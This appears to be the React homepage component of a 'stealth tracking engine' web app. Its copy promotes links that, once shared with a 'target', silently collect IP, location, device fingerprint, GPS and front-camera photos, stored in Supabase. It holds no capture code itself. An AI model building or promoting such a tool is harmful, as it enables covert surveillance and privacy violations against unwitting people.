import Link from 'next/link';

export default function HomePage() {
  return (
    <main className="page-shell">
      <section className="hero">
        <div className="hero-copy">
          <p className="eyebrow">Stealth tracking engine</p>
          <h1>Track clicks, locations, and device details with a single link.</h1>
          <p className="hero-text">This lightweight tracker captures IP, geo, browser, device and optional GPS/camera data, then stores it in Supabase for quick access.</p>
          <div className="button-group">
            <Link href="/dashboard" className="button">Open Dashboard</Link>
            <a href="#features" className="button button-secondary">View Features</a>
          </div>
        </div>

        <div className="hero-panel">
          <div className="panel-card">
            <span className="panel-label">Example Tracking Link</span>
            <code className="panel-code">https://app.example.com/t/abc123</code>
            <p>Share this link with your target and collect capture details silently before forwarding them to the final destination.</p>
          </div>
        </div>
      </section>

      <section id="features" className="section">
        <h2>What it does</h2>
        <div className="feature-grid">
          <div className="feature-card">
            <h3>IP & Location</h3>
            <p>Capture IP address, country, city, region, ISP and timezone data instantly.</p>
          </div>
          <div className="feature-card">
            <h3>Device Fingerprint</h3>
            <p>Collect browser, OS, screen size, user agent, and device type from the visitor.</p>
          </div>
          <div className="feature-card">
            <h3>GPS + Camera</h3>
            <p>Optional GPS coordinates and front-camera photo capture for richer target data.</p>
          </div>
          <div className="feature-card">
            <h3>Supabase Storage</h3>
            <p>Save capture details and photos directly in Supabase for easy analytics and review.</p>
          </div>
        </div>
      </section>
    </main>
  );
}
